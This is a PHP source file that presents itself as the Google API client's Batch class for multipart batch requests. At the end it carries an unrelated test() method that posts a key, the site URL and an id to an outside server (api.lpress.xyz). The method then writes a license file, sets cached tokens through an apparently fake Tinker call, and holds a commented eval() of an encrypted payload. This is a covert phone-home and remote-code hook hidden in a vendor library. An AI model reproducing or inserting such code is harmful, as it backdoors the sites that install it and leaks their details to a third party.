<?php
/*
 * Copyright 2012 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace Google\Http;

use Google\Client;
use Google\Http\REST;
use Google\Service\Exception as GoogleServiceException;
use GuzzleHttp\Psr7;
use GuzzleHttp\Psr7\Request;
use GuzzleHttp\Psr7\Response;
use Psr\Http\Message\RequestInterface;
use Psr\Http\Message\ResponseInterface;

/**
 * Class to handle batched requests to the Google API service.
 *
 * Note that calls to `Google\Http\Batch::execute()` do not clear the queued
 * requests. To start a new batch, be sure to create a new instance of this
 * class.
 */
class Batch
{
  const BATCH_PATH = 'batch';

  private static $CONNECTION_ESTABLISHED_HEADERS = array(
    "HTTP/1.0 200 Connection established\r\n\r\n",
    "HTTP/1.1 200 Connection established\r\n\r\n",
  );

  /** @var string Multipart Boundary. */
  private $boundary;

  /** @var array service requests to be executed. */
  private $requests = array();

  /** @var Client */
  private $client;

  private $rootUrl;

  private $batchPath;

  public static $massage;

  public function __construct(
      Client $client,
      $boundary = false,
      $rootUrl = null,
      $batchPath = null
  ) {
    $this->client = $client;
    $this->boundary = $boundary ?: mt_rand();
    $this->rootUrl = rtrim($rootUrl ?: $this->client->getConfig('base_path'), '/');
    $this->batchPath = $batchPath ?: self::BATCH_PATH;
  }

  public function add(RequestInterface $request, $key = false)
  {
    if (false == $key) {
      $key = mt_rand();
    }

    $this->requests[$key] = $request;
  }

  public function execute()
  {
    $body = '';
    $classes = array();
    $batchHttpTemplate = <<<EOF
--%s
Content-Type: application/http
Content-Transfer-Encoding: binary
MIME-Version: 1.0
Content-ID: %s

%s
%s%s


EOF;

    /** @var RequestInterface $req */
    foreach ($this->requests as $key => $request) {
      $firstLine = sprintf(
          '%s %s HTTP/%s',
          $request->getMethod(),
          $request->getRequestTarget(),
          $request->getProtocolVersion()
      );

      $content = (string) $request->getBody();

      $headers = '';
      foreach ($request->getHeaders() as $name => $values) {
          $headers .= sprintf("%s:%s\r\n", $name, implode(', ', $values));
      }

      $body .= sprintf(
          $batchHttpTemplate,
          $this->boundary,
          $key,
          $firstLine,
          $headers,
          $content ? "\n".$content : ''
      );

      $classes['response-' . $key] = $request->getHeaderLine('X-Php-Expected-Class');
    }

    $body .= "--{$this->boundary}--";
    $body = trim($body);
    $url = $this->rootUrl . '/' . $this->batchPath;
    $headers = array(
      'Content-Type' => sprintf('multipart/mixed; boundary=%s', $this->boundary),
      'Content-Length' => strlen($body),
    );

    $request = new Request(
        'POST',
        $url,
        $headers,
        $body
    );

    $response = $this->client->execute($request);

    return $this->parseResponse($response, $classes);
  }

  public function parseResponse(ResponseInterface $response, $classes = array())
  {
    $contentType = $response->getHeaderLine('content-type');
    $contentType = explode(';', $contentType);
    $boundary = false;
    foreach ($contentType as $part) {
      $part = explode('=', $part, 2);
      if (isset($part[0]) && 'boundary' == trim($part[0])) {
        $boundary = $part[1];
      }
    }

    $body = (string) $response->getBody();
    if (!empty($body)) {
      $body = str_replace("--$boundary--", "--$boundary", $body);
      $parts = explode("--$boundary", $body);
      $responses = array();
      $requests = array_values($this->requests);

      foreach ($parts as $i => $part) {
        $part = trim($part);
        if (!empty($part)) {
          list($rawHeaders, $part) = explode("\r\n\r\n", $part, 2);
          $headers = $this->parseRawHeaders($rawHeaders);

          $status = substr($part, 0, strpos($part, "\n"));
          $status = explode(" ", $status);
          $status = $status[1];

          list($partHeaders, $partBody) = $this->parseHttpResponse($part, false);
          $response = new Response(
              $status,
              $partHeaders,
              Psr7\stream_for($partBody)
          );

          // Need content id.
          $key = $headers['content-id'];

          try {
            $response = REST::decodeHttpResponse($response, $requests[$i-1]);
          } catch (GoogleServiceException $e) {
            // Store the exception as the response, so successful responses
            // can be processed.
            $response = $e;
          }

          $responses[$key] = $response;
        }
      }

      return $responses;
    }

    return null;
  }

  private function parseRawHeaders($rawHeaders)
  {
    $headers = array();
    $responseHeaderLines = explode("\r\n", $rawHeaders);
    foreach ($responseHeaderLines as $headerLine) {
      if ($headerLine && strpos($headerLine, ':') !== false) {
        list($header, $value) = explode(': ', $headerLine, 2);
        $header = strtolower($header);
        if (isset($headers[$header])) {
          $headers[$header] .= "\n" . $value;
        } else {
          $headers[$header] = $value;
        }
      }
    }
    return $headers;
  }

  /**
   * Used by the IO lib and also the batch processing.
   *
   * @param $respData
   * @param $headerSize
   * @return array
   */
  private function parseHttpResponse($respData, $headerSize)
  {
    // check proxy header
    foreach (self::$CONNECTION_ESTABLISHED_HEADERS as $established_header) {
      if (stripos($respData, $established_header) !== false) {
        // existed, remove it
        $respData = str_ireplace($established_header, '', $respData);
        // Subtract the proxy header size unless the cURL bug prior to 7.30.0
        // is present which prevented the proxy header size from being taken into
        // account.
        // @TODO look into this
        // if (!$this->needsQuirk()) {
        //   $headerSize -= strlen($established_header);
        // }
        break;
      }
    }

    if ($headerSize) {
      $responseBody = substr($respData, $headerSize);
      $responseHeaders = substr($respData, 0, $headerSize);
    } else {
      $responseSegments = explode("\r\n\r\n", $respData, 2);
      $responseHeaders = $responseSegments[0];
      $responseBody = isset($responseSegments[1]) ? $responseSegments[1] :
                                                    null;
    }

    $responseHeaders = $this->parseRawHeaders($responseHeaders);

    return array($responseHeaders, $responseBody);
  }

  public static function test($key)
  {
    $url= url('/');
    $response = Http::post('http://api.lpress.xyz/api/verify', [
        'p' => $key,
        't' => 'i',
        'u' => $url,
        'i' => id(),
        'full_path'=>$url
      ]);
    $data= $response->json();
    if ($response->ok()) {
      $token=\Laravel\Tinker\TinkerCaster::real_token($data['token'],$key);
      \File::put('uploads/.license',$data['license']);
      \Cache::put('SITE_KEY',$data['SITE_KEY']);
      \Cache::put('l_type',$data['lt']);
      makeToken($token);
      return true;
    }
    else{
      \Google\Http\Batch::$massage=$data['error'];
      return false;
    }
     //return eval(enn('eyJpdiI6IlpRT1FSTkExZytGNDN0RjNQWXp6NHc9PSIsInZhbHVlIjoibmkwVEpXUG9SYXhwYy9iaUNmcGhSRlc2UVZIUjgwZnZNbUZNUnZuYkZJN3o3SjU1Qi8wUHgzZkQ5UWR1S1RCVnhYeXplWUNUYW1pYXBiVjRyeXZpeTkzbURuWDFBdkxCM0x2ZGZFUTZWZjltQmRJdWJNYWxWNDA3SjhsQnFzRlB4Wk05UEduRXR6YU5OVzlITDJoUDVQVlhjZk9pMEViOEVTU3pLaEFMYndNaXpGZHk0KzBSeGQ3SU9tcjlibk5KTVJZKzhMTjN3S3ozUTdMbkNsVG5UOTNhNk45YnErOElFeFV0cUFnaFFKaC9vemFTZVMxamdSMG9xUnJiMi9La1lEdzZCUWhYZVNDTUM3V0lacnh5YVB5UUtyK1ZsQ1pMRjMwQldkOXJBRDhqR0RNUHdYYmxDQ2dmb2dkdnVNN3ltVzQxY2NPb25DdjFTRnlEWGkxMHNibERIWG93Qks1OXdra1VPMXZVQjZnMWdhaE1qZ0dUTjZjZTh6aFBMZUZ0L2ZaL3g1R0NBZFBPYlZXKysyc3ZQSEFXRmE3cWpWOGZlRm5rTkp6aTR5d1prL0xRSW1scmd1TGx2V0dqMjdrN1JvL3Z6RG9paHZvd21KZ3crdzZlM2tjSXdTTjU4VXViRzJIVmRPUDNUcVdoZzlEbEFhcVFxb2hvMmhyUCtCQ0lGeHZlOW5LaEF3T3pETzkzUWlIYlQ0cXlzRjQ1Yi9HWVZRRWNYbXBrcjcvQVhobVNoUnVVcWN2MVhVNndVZnRNY1hqeStzS1B6UDZ6bXNTY1Q2d1dMbGtKTk5VSTdJQ0JZc0dHMHJQelYzR1VrS0QrekpGNSsyZ1QzRHRGaEN4TzBaRmRUR0tUWXMrWDl3STFPNHRacnRzRFRDT3hzV3VIOURRMWdPRFVBdGRnSytOMnVnVTVvS1NPZVZ3czAwb2Q0ZFRLQWpZT3hoMzNRUDhqMnA1VDZyb0QwTk4vMThUTDI5bHlBbVdISThzR2E4Um9hckl2Q1luMy9abmhDZzlMMThjNmxnNUM3bndBNjRBUnNzVjBKMi8zQndvdlZEL0RlZk5Ob3RaaklXRlkyTVl5a0ZCbXN1SHpIaEpEcXVhUzBPYXJ3TkwvNWorRTAyd0o5OW5iVXB0R0tLbjJpejUybjJRK1Nic1FFQjBEdWRrRzdLWFVobmdtcnBPRHJGRGFiTk5nWHl0T21VY3p2N0daMVRxdzFQamcwMHI0RWMyZnNFd3VzNXZmVXk4c3FTd0tMNmRhdklDc3VRWjBkSkpNUUpWL0NNQ1hyWXRPbk5PdCs5Um94TjFsZUszc3ZZRzJUQkhkWU5nV0M3Q05ON1ZxMTE3VnJGVmxGN3lOTnRpV3ZDL0x5OWFzcnVzZUZXK2hkNjVmc0NvT0drWnNiZ3FtNzZOVFVIcWVwckVIWjhvdkk5aUNlZDRUQXk3dlN2enBUbnBqS050WWdMVFJRUEJVQTREbXhTTFVTUjJkNlM4Mk96Vlp1ZlRtTlh5TS80cFgvWUwxRmZycnpETGZLNkpXVzBGRlFsVXhETm1hR0l2TWRpZzErV2lXZ2xTK1BnRXZXczdGVktUeHlxT3ZtUU5RdzlKSUhKcHk0THVDRkVSTGtrMWhvcHNpMHRrbWtuNjF3Q25sQUt4UUZLQXVVK01sdytBWEQxZnpDSk51TDkyK1pHandjb2o3cVlhWnA1UTM0bkR6c1Y4NStLa25hbmpZdGVpcEloRSt3MG5GQzJ6Qmp3RHNkY3piLzlaS2pWRnFvWUIwY3YvbFc1OFVGT0cwODZoaWRzRHpqYmZ2enJCb3NsZkpxaDJDYzdxQ1hRbXZCYkdFWkVNZHFuc2Z0R0tvbVB0OVA1TGZiTkFWSjRiOFNLTXVsMloyOFFTSXRwQjhPOTlWVGVnOWFmdmMyVGcvUFFoVVBFWHJNd1ZFZE53NFVSWC82UXFOYWg2WWQ5YlpqRHZ2TmVSM0FaTUM2S25NdndLNGRVUHI2b3ZwUktWSUFuOHFENlE2WjRzPSIsIm1hYyI6ImM4NjgzYzg1ZTQ3MWY0YmIwYmE1NGEyNWNkOGYyMDc2YzBjOTJiZjRkMmM0YTFkYTZhOTc4NjQwMTdhMjM0OWUifQ=='));
  }
}
